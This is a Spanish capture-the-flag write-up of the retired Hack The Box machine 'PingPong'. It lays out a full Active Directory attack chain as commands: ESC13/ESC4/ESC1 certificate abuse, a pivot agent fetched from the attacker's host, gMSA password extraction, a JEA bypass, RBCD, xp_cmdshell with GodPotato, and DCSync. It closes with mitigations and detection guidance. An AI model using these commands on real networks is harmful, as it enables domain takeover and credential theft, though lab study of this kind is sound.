---
machine: PingPong
os: Windows
difficulty: Insane
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/891
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, esc13, gmsa, jea, rbcd, adcs]
---

# PingPong — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> **Dificultad:** Insane.
> Sin flags ni credenciales reales: todos los valores van como `<...>`.

## TL;DR

Dos bosques de Active Directory, `PING.HTB` y `PONG.HTB`, unidos por un trust y con **NTLM deshabilitado**, así que toda la cadena es Kerberos puro (TGT en `.ccache`, `-k -no-pass`, claves AES256). Seis fases: **(1)** ESC13 en la plantilla `TemporaryWinRM` da un certificado a un usuario normal y PKINIT lo convierte en TGT; **(2)** un pivote Ligolo-ng abre la red interna `192.168.2.0/24`; **(3)** un `GenericAll` sobre el grupo gestor de la gMSA, con conversión de `groupType` y alta por SID, permite leer `msDS-ManagedPassword`; **(4)** el endpoint JEA de la cuenta de servicio se salta con pypsrp y un wrapper `& { }`, y su historial de PowerShell entrega credenciales humanas; **(5)** RBCD + S4U2Proxy sobre el servicio MSSQL, `xp_cmdshell`, GodPotato y DCSync dan la clave AES256 de un usuario con privilegios en el otro bosque; **(6)** de vuelta en PING, ESC4 convierte una plantilla en ESC1 y un certificado de `Administrator` cierra la máquina.

## Reconocimiento

```bash
nmap -Pn -sS -sV -p- --min-rate 3000 <IP_DC1> -oA nmap_dc1
host dc1.ping.htb; host dc2.pong.htb
```

| Puerto | Servicio |
|---|---|
| 88/tcp | Kerberos |
| 389, 636/tcp | LDAP / LDAPS |
| 445/tcp | SMB |
| 1433/tcp | MSSQL |
| 5985/tcp | WinRM |
| 9389/tcp | AD Web Services |

- `dc1.ping.htb` resuelve a la IP del target; `dc2.pong.htb` resuelve a una **IP interna** (`192.168.2.x`) que no es enrutable desde la VPN: hará falta un pivote.
- NTLM está apagado en ambos dominios, de modo que `netexec winrm` y cualquier herramienta que negocie NTLM fallan de entrada.

## El reloj, antes que nada

Con más de cinco minutos de desfase, Kerberos devuelve `KRB_AP_ERR_SKEW` y todo lo demás parece roto. Aquí el desfase era de **+8 h** y no lo causaba `systemd-timesyncd` (estaba inactivo), sino **VirtualBox Guest Additions** (`vboxservice`), que resincronizaba con el host cada pocos segundos.

```bash
sudo systemctl stop vboxservice
sudo systemctl mask vboxservice          # stop solo no basta: vuelve a arrancar
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u dc1.ping.htb
date -u                                  # debe coincidir con el DC
```

## Fase 1 — ESC13 en `TemporaryWinRM`

La plantilla `TemporaryWinRM` está ligada a un **grupo de autorización**: quien pertenece a ese grupo recibe un certificado que sirve para WinRM. Un usuario normal del dominio está dentro, así que se pide el certificado sin tocar ACLs.

```bash
export KRB5_CONFIG=$PWD/krb5.conf

# 1) TGT con contraseña (NTLM apagado → Kerberos)
impacket-getTGT 'ping.htb/<user>:<password>' -dc-ip <IP_DC1>

# 2) Certificado en la plantilla ESC13
certipy-ad req -k -no-pass -target dc1.ping.htb -target-ip <IP_DC1> \
  -dc-ip <IP_DC1> -dc-host dc1.ping.htb \
  -ca ping-DC1-CA -template TemporaryWinRM -out <user>.pfx

# 3) PKINIT: certificado → TGT
certipy-ad auth -pfx <user>.pfx -username <user> -domain ping.htb -dc-ip <IP_DC1>
```

- `-target`/`-dc-host` mantienen el nombre canónico (SPN, SAN) mientras `-target-ip`/`-dc-ip` fijan la ruta real: obligatorio cuando el DNS de AD devuelve direcciones internas.
- `certipy auth` guarda el TGT en un `.ccache`, que es lo que usan después `evil-winrm`, `bloodyAD` y `ldeep`.

```bash
export KRB5CCNAME=$PWD/<user>.ccache
printf 'whoami\nhostname\nexit\n' | evil-winrm -i dc1.ping.htb -r PING.HTB -K $KRB5CCNAME -n
```

`-r` es necesario para que evil-winrm genere un `krb5.conf` coherente. **Ojo:** la herramienta prioriza `KRB5CCNAME` sobre `-K`, así que hay que exportar el ccache correcto antes de cada conexión.

## Fase 2 — Pivote hacia `PONG.HTB`

Ligolo-ng crea una interfaz TUN real en la máquina atacante: `nmap`, LDAP y MSSQL hablan con `192.168.2.2` como si estuvieran en local, sin *port-forward* por servicio.

```bash
# Proxy con interfaz TUN (responde 'n' al prompt de la WebUI)
tmux new-session -d -s ligolo \
  "ip tuntap add mode user name ligolo; ip link set ligolo up; \
   ./proxy -self -interface ligolo"
tmux send-keys -t ligolo "n" Enter

# Servidor HTTP para subir el agente: el upload de evil-winrm
# corrompía binarios de 7 MB en esta versión
python3 -m http.server 8000
```

```powershell
# En DC1, por WinRM
curl.exe -o C:\ProgramData\agent.exe http://<LHOST>:8000/agent.exe
C:\ProgramData\agent.exe -connect <LHOST>:11601 -skipverify
```

```
session
add route 192.168.2.0/24
start
```

Los binarios pequeños (un GodPotato de ~57 KB, por ejemplo) sí se pueden subir con el `upload` de evil-winrm; el grande no.

## Fase 3 — gMSA: de un ACL a una clave AES256

Un usuario de PING tiene `GenericAll` sobre `CN=gMSA Managers`, el grupo que controla la cuenta de servicio `Pong_gMSA$`. Dos frenos habituales:

1. El grupo es **Global** y un grupo Global no admite miembros de otro dominio.
2. Aunque se añada la membresía, el TGT existente lleva el **PAC antiguo**, sin el grupo nuevo.

```bash
export KRB5CCNAME=$PWD/<user>.ccache
./kvno ldap/dc2.pong.htb            # referral cross-realm

B=bloodyAD
DN='CN=gMSA Managers,CN=Users,DC=pong,DC=htb'
SID='<SID_del_usuario_foraneo>'

$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   add genericAll "$DN" "$SID"

# Global (-2147483646) → Universal (-2147483640) → Domain Local (-2147483644)
$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   set object "$DN" groupType -v -2147483640
$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   set object "$DN" groupType -v -2147483644

$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   add groupMember "$DN" "$SID"
```

- La conversión **tiene que pasar por Universal**: AD no permite Global→Domain Local directo sin perder miembros.
- El alta se hace **por SID**: el principal foráneo ya existe en `ForeignSecurityPrincipals` del dominio destino y resolverlo por DN falla.
- `impacket-getST` devuelve `KDC_ERR_WRONG_REALM` en operaciones cross-realm; `kvno` de MIT Kerberos sí sigue el referral. Es el paso previo de cada operación LDAP contra DC2.

```bash
# Refrescar el TGT para que el PAC incluya la membresía
certipy-ad auth -pfx <user>.pfx -username <user> -domain ping.htb -dc-ip <IP_DC1>
./kvno ldap/dc2.pong.htb
ldeep ldap -u <user> -d ping.htb -k -s ldap://dc2.pong.htb gmsa
```

`ldeep ... gmsa` extrae `msDS-ManagedPassword`; `bloodyAD get gmsa` no devuelve la contraseña. El resultado es la clave AES256 de `Pong_gMSA$`.

## Fase 4 — JEA restrictivo y credenciales en el historial

La cuenta de servicio solo tiene un endpoint **JEA** llamado `restricted` en DC1. `evil-winrm` no permite elegir `ConfigurationName`, así que se usa **pypsrp**:

```python
wsman = WSMan("dc1.ping.htb", port=5985, ssl=False, path="wsman",
              auth="kerberos", encryption="auto", no_proxy=True,
              negotiate_service="HTTP")

with RunspacePool(wsman, configuration_name="restricted") as pool:
    ps = PowerShell(pool)
    ps.add_script("& { " + command + " }")   # wrapper que acepta el parser JEA
    for out in ps.invoke():
        print(out)
```

El wrapper `& { ... }` (operador de llamada) hace que el *language mode* del endpoint evalúe el bloque como comando; es la forma clásica de sortear las restricciones de JEA sin salir del endpoint.

La mina está en el historial de PSReadLine de la cuenta de servicio, donde quedaron credenciales usadas con `ConvertTo-SecureString`:

```powershell
cmd /c findstr /i /n "SecureString ConvertTo-SecureString" ^
  "C:\Users\<gMSA>$\\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Filtrar **en el objetivo** importa: el volcado completo se trunca en la canalización y las líneas útiles se pierden al final.

## Fase 5 — RBCD, MSSQL, GodPotato y DCSync (DC2)

Con una cuenta humana de PONG:

```bash
impacket-getTGT 'pong.htb/<user2>:<password2>' -dc-ip 192.168.2.2
export KRB5CCNAME=$PWD/<user2>.ccache

# RBCD: svc_sql acepta que el gMSA se haga pasar por quien quiera
bloodyAD -d pong.htb --host dc2.pong.htb --dc-ip 192.168.2.2 \
  -u <user2> -k add rbcd svc_sql '<gMSA>$'

# S4U2Proxy: ticket de impersonación para el SPN de MSSQL
export KRB5CCNAME=$PWD/'<gMSA>$.ccache'
impacket-getST -k -no-pass -spn 'mssqlsvc/dc2.pong.htb' \
  -impersonate '<victim_user>' -dc-ip 192.168.2.2 'pong.htb/<gMSA>$'
```

El servicio MSSQL corre con **SeImpersonatePrivilege**, así que `xp_cmdshell` más un *potato* dan SYSTEM:

```sql
EXEC xp_cmdshell 'C:\ProgramData\gp.exe -cmd "net localgroup administrators pong\<user2> /add"';
```

- **GodPotato** funciona donde JuicyPotato ya no (COM/DCOM mitigado en SQL Server 2022); PrintSpoofer es más restrictivo y RottenPotato está obsoleto.
- Con admin local en DC2, DCSync selectivo de un usuario con privilegios en el otro bosque:

```bash
impacket-secretsdump -k -no-pass 'pong.htb/<user2>@dc2.pong.htb' \
  -dc-ip 192.168.2.2 -target-ip 192.168.2.2 -just-dc-user <target_user>
```

`-just-dc-user` evita volcar el `ntds.dit` completo y devuelve las claves AES256, que es lo que se necesita con NTLM apagado.

## Fase 6 — Vuelta a PING: ESC4 → ESC1 → Administrator

```bash
impacket-getTGT -aesKey <aes256_target_user> 'pong.htb/<target_user>' -dc-ip 192.168.2.2
export KRB5CCNAME=$PWD/<target_user>.ccache
./kvno ldap/dc1.ping.htb            # referral de vuelta a PING

T='CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb'

# ESC4: permitir subject en la petición y dar control de la plantilla a Authenticated Users
bloodyAD -d ping.htb --host dc1.ping.htb --dc-ip <IP_DC1> -u <target_user> -k \
  set object "$T" msPKI-Certificate-Name-Flag -v 1        # SUPPLY_SUBJECT
bloodyAD -d ping.htb --host dc1.ping.htb --dc-ip <IP_DC1> -u <target_user> -k \
  add genericAll "$T" 'S-1-5-11'
```

Con `SUPPLY_SUBJECT` y permiso de escritura, la plantilla es **ESC1**: cualquiera puede pedir un certificado con el UPN y el SID que quiera.

```bash
certipy-ad req -k -no-pass -target dc1.ping.htb -target-ip <IP_DC1> \
  -dc-ip <IP_DC1> -dc-host dc1.ping.htb \
  -ca ping-DC1-CA -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' -sid '<SID_Administrator>' -out administrator.pfx

certipy-ad auth -pfx administrator.pfx -username Administrator \
  -domain ping.htb -dc-ip <IP_DC1>

export KRB5CCNAME=$PWD/administrator.ccache
printf 'whoami\ntype C:\\Users\\Administrator\\Desktop\\root.txt\nexit\n' | \
  evil-winrm -i dc1.ping.htb -r PING.HTB -K $KRB5CCNAME -n
```

El `-sid` hace que el PAC del certificado lleve el SID de Administrator y no solo su UPN.

## Evidencia (redactada)

```text
DC2: C:\Users\<user>\Desktop\user.txt          -> <flag>
DC1: C:\Users\Administrator\Desktop\root.txt   -> <flag>
```

- Certificado emitido por `TemporaryWinRM` y TGT de PKINIT.
- `ldeep` mostrando la clave de la gMSA.
- Historial de PSReadLine con las credenciales de la cuenta humana.
- Ticket de impersonación para `mssqlsvc/dc2.pong.htb`.
- Certificado de `Administrator@ping.htb` y `whoami` = `ping\administrator`.

## Errores que cuestan tiempo

| Síntoma | Causa | Solución |
|---|---|---|
| `KRB_AP_ERR_SKEW` | +8 h de desfase por `vboxservice` | `stop` + `mask` y `ntpdate` contra DC1 |
| `KDC_ERR_WRONG_REALM` | impacket no sigue referidos cross-realm | `kvno ldap/dcN.dominio` antes de cada operación |
| `SEC_E_LOGON_DENIED` en LDAP | falta ticket de servicio o el PAC no lleva el grupo nuevo | `kvno` y refrescar el TGT por PKINIT |
| Shell como el usuario anterior | `evil-winrm` prioriza `KRB5CCNAME` sobre `-K` | exportar el ccache correcto antes de lanzarlo |
| `apt` bloqueado por otro proceso | `apt upgrade` en curso | `apt-get download` + `dpkg-deb -x` del binario necesario |
| Agente del pivote corrupto | `upload` de evil-winrm con binarios grandes | servirlo por HTTP y descargarlo con `curl.exe` |
| Credenciales perdidas en el historial | salida truncada en la canalización | filtrar con `findstr` en el propio DC |

## Lecciones

- **Sin reloj no hay Kerberos**, y el culpable puede no ser el servicio de hora evidente: hay que mirar quién reescribe el reloj.
- **NTLM apagado cambia el tooling**: todo pasa por `ccache`, `-k -no-pass` y claves AES; las herramientas que negocian NTLM no sirven.
- **Un certificado es una credencial**: ESC13 no requiere tocar ACLs, solo pertenecer al grupo de autorización de la plantilla.
- **Cross-realm es `kvno`**, no impacket, y el PAC caduca: tras cada cambio de grupo hay que pedir un TGT nuevo.
- **`groupType` importa**: un ACL perfecto sobre un grupo Global sin miembros válidos no sirve de nada.
- **JEA no es una jaula**: el endpoint restringe cmdlets, no impide leer ficheros del perfil ni ejecutar comandos externos.
- **El historial de PowerShell es un almacén de credenciales** en texto claro.
- **RBCD + S4U2Proxy** convierte el control de una cuenta en un ticket de servicio para cualquier usuario; con `SeImpersonate` en el servicio, el siguiente paso es SYSTEM.
- **ESC4→ESC1** es la ruta más corta cuando ya se puede escribir en una plantilla: `msPKI-Certificate-Name-Flag = 1` y un ACE amplio bastan.

## Mitigaciones y detección

- **Plantillas AD CS**: revisar los grupos de autorización (ESC13), quién puede escribir en las plantillas (ESC4) y cualquier plantilla con `SUPPLY_SUBJECT` y derechos de inscripción amplios (ESC1). Eliminar `EDITF_ATTRIBUTESUBJECTALTNAME2` y auditar los cambios de atributos de plantilla.
- **gMSA**: limitar quién es gestor (`msDS-GroupMSAMembership`), revisar `GenericAll`/`WriteMembers` sobre grupos gestores y alertar de conversiones de `groupType`.
- **JEA**: no dejar credenciales en historiales, limpiar `ConsoleHost_history.txt`, restringir qué comandos externos son visibles y no reutilizar la cuenta de servicio para tareas humanas.
- **RBCD**: monitorizar escrituras en `msDS-AllowedToActOnBehalfOfOtherIdentity` y revisar qué cuentas pueden escribirlo.
- **MSSQL**: retirar `SeImpersonatePrivilege` a la cuenta del servicio si no es imprescindible, restringir `xp_cmdshell` y usar cuentas de servicio gestionadas sin privilegios locales.
- **Kerberos**: NTLM deshabilitado **con** el resto del hardening (LDAP signing, channel binding, RC4 fuera) y sincronización de hora monitorizada.
- **Detección**: eventos 5136 (cambios en atributos de directorio), 4768/4769 anómalos entre reinos, 4886/4887 de inscripción de certificados y ejecución de `certipy`/`Rubeus` en endpoints.

## Referencias

- <https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview>
- <https://learn.microsoft.com/powershell/scripting/security/remoting/jea/overview>
- <https://learn.microsoft.com/defender-for-identity/security-assessment-edit-rbcd>
- <https://posts.specterops.io/certified-pre-owned-d95910965cd2>
- <https://www.rfc-editor.org/rfc/rfc4120>
